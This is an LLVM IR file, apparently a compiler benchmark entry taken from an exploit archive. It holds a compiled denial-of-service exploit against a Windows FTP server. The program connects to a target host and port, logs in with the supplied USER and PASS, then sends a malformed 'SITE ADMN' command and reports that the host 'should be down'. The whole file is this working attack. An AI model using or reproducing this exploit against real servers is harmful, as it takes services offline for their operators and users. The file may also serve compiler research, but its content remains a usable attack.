; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_3126.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_3126.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i8, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [41 x i8] c"[+] Usage: %s <ip> <port> <user> <pass>\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"[+] Connecting to %s:%s ... \00", align 1
@.str.2 = private unnamed_addr constant [41 x i8] c"Failed\0A[-] Could not init gethostbyname\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [25 x i8] c"Failed\0A[-] Socket error\0A\00", align 1
@.str.4 = private unnamed_addr constant [54 x i8] c"Failed\0A[-] Sorry, cannot connect to %s:%s. Error: %i\0A\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"OK\0A\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"USER \00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"\0D\0A\00\00", align 1
@.str.8 = private unnamed_addr constant [22 x i8] c"[+] Sending USER ... \00", align 1
@.str.9 = private unnamed_addr constant [27 x i8] c"Failed\0A[-] Could not send\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PASS \00", align 1
@.str.11 = private unnamed_addr constant [22 x i8] c"[+] Sending PASS ... \00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"SITE ADMN \00", align 1
@.str.13 = private unnamed_addr constant [27 x i8] c"[+] Sending SITE ADMN ... \00", align 1
@.str.14 = private unnamed_addr constant [25 x i8] c"[+] Host should be down\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [1024 x i8], align 16
  %11 = alloca [100 x i8], align 16
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 100, i32* %12, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp ne i32 %13, 5
  br i1 %14, label %15, label %20

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0), i8* %18)
  store i32 1, i32* %3, align 4
  br label %185

20:                                               ; preds = %2
  %21 = call i32 (...) @WSACleanup()
  %22 = call i32 @MAKEWORD(i32 2, i32 0)
  %23 = call i32 @WSAStartup(i32 %22, i32* %8)
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i8* %26, i8* %29)
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call %struct.hostent* @gethostbyname(i8* %33)
  store %struct.hostent* %34, %struct.hostent** %6, align 8
  %35 = icmp eq %struct.hostent* %34, null
  br i1 %35, label %36, label %38

36:                                               ; preds = %20
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %185

38:                                               ; preds = %20
  %39 = load i32, i32* @PF_INET, align 4
  %40 = load i32, i32* @SOCK_STREAM, align 4
  %41 = call i32 @socket(i32 %39, i32 %40, i32 0)
  store i32 %41, i32* %9, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %45

43:                                               ; preds = %38
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %185

45:                                               ; preds = %38
  %46 = load i32, i32* @PF_INET, align 4
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 3
  store i32 %46, i32* %47, align 4
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 2
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @atoi(i8* %50)
  %52 = call i32 @htons(i32 %51)
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %52, i32* %53, align 4
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %55 = load %struct.hostent*, %struct.hostent** %6, align 8
  %56 = getelementptr inbounds %struct.hostent, %struct.hostent* %55, i32 0, i32 0
  %57 = load i64, i64* %56, align 8
  %58 = inttoptr i64 %57 to %struct.in_addr*
  %59 = bitcast %struct.in_addr* %54 to i8*
  %60 = bitcast %struct.in_addr* %58 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %59, i8* align 4 %60, i64 4, i1 false)
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %62 = call i32 @memset(i8* %61, i32 0, i32 8)
  %63 = load i32, i32* %9, align 4
  %64 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %65 = call i32 @connect(i32 %63, %struct.sockaddr* %64, i32 4)
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %76

67:                                               ; preds = %45
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 1
  %70 = load i8*, i8** %69, align 8
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 2
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 (...) @WSAGetLastError()
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.4, i64 0, i64 0), i8* %70, i8* %73, i32 %74)
  store i32 1, i32* %3, align 4
  br label %185

76:                                               ; preds = %45
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0))
  %78 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %79 = call i32 @memset(i8* %78, i32 0, i32 1024)
  %80 = load i32, i32* %9, align 4
  %81 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %82 = call i32 @recv(i32 %80, i8* %81, i32 1024, i32 0)
  %83 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %84 = load i32, i32* %12, align 4
  %85 = call i32 @memset(i8* %83, i32 0, i32 %84)
  %86 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %87 = call i32 @memcpy(i8* %86, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i32 5)
  %88 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %89 = getelementptr inbounds i8, i8* %88, i64 5
  %90 = load i8**, i8*** %5, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 3
  %92 = load i8*, i8** %91, align 8
  %93 = load i8**, i8*** %5, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 3
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 @strlen(i8* %95)
  %97 = call i32 @memcpy(i8* %89, i8* %92, i32 %96)
  %98 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %99 = getelementptr inbounds i8, i8* %98, i64 5
  %100 = load i8**, i8*** %5, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 3
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 @strlen(i8* %102)
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %99, i64 %104
  %106 = call i32 @memcpy(i8* %105, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32 3)
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0))
  %108 = load i32, i32* %9, align 4
  %109 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %110 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %111 = call i32 @strlen(i8* %110)
  %112 = call i32 @send(i32 %108, i8* %109, i32 %111, i32 0)
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %116

114:                                              ; preds = %76
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %185

116:                                              ; preds = %76
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0))
  %118 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %119 = call i32 @memset(i8* %118, i32 0, i32 1024)
  %120 = load i32, i32* %9, align 4
  %121 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %122 = call i32 @recv(i32 %120, i8* %121, i32 1024, i32 0)
  %123 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %124 = load i32, i32* %12, align 4
  %125 = call i32 @memset(i8* %123, i32 0, i32 %124)
  %126 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %127 = call i32 @memcpy(i8* %126, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i32 5)
  %128 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %129 = getelementptr inbounds i8, i8* %128, i64 5
  %130 = load i8**, i8*** %5, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 4
  %132 = load i8*, i8** %131, align 8
  %133 = load i8**, i8*** %5, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 4
  %135 = load i8*, i8** %134, align 8
  %136 = call i32 @strlen(i8* %135)
  %137 = call i32 @memcpy(i8* %129, i8* %132, i32 %136)
  %138 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %139 = getelementptr inbounds i8, i8* %138, i64 5
  %140 = load i8**, i8*** %5, align 8
  %141 = getelementptr inbounds i8*, i8** %140, i64 4
  %142 = load i8*, i8** %141, align 8
  %143 = call i32 @strlen(i8* %142)
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %139, i64 %144
  %146 = call i32 @memcpy(i8* %145, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32 3)
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i64 0, i64 0))
  %148 = load i32, i32* %9, align 4
  %149 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %150 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %151 = call i32 @strlen(i8* %150)
  %152 = call i32 @send(i32 %148, i8* %149, i32 %151, i32 0)
  %153 = icmp eq i32 %152, -1
  br i1 %153, label %154, label %156

154:                                              ; preds = %116
  %155 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %185

156:                                              ; preds = %116
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0))
  %158 = load i32, i32* %9, align 4
  %159 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %160 = call i32 @recv(i32 %158, i8* %159, i32 1024, i32 0)
  %161 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %162 = load i32, i32* %12, align 4
  %163 = call i32 @memset(i8* %161, i32 0, i32 %162)
  %164 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %165 = call i32 @memcpy(i8* %164, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i64 0, i64 0), i32 10)
  %166 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %167 = getelementptr inbounds i8, i8* %166, i64 10
  %168 = call i32 @memset(i8* %167, i32 32, i32 1)
  %169 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %170 = getelementptr inbounds i8, i8* %169, i64 10
  %171 = getelementptr inbounds i8, i8* %170, i64 1
  %172 = call i32 @memcpy(i8* %171, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32 3)
  %173 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0))
  %174 = load i32, i32* %9, align 4
  %175 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %176 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %177 = call i32 @strlen(i8* %176)
  %178 = call i32 @send(i32 %174, i8* %175, i32 %177, i32 0)
  %179 = icmp eq i32 %178, -1
  br i1 %179, label %180, label %182

180:                                              ; preds = %156
  %181 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %185

182:                                              ; preds = %156
  %183 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0))
  %184 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.14, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %185

185:                                              ; preds = %182, %180, %154, %114, %67, %43, %36, %15
  %186 = load i32, i32* %3, align 4
  ret i32 %186
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @WSACleanup(...) #1

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @WSAGetLastError(...) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
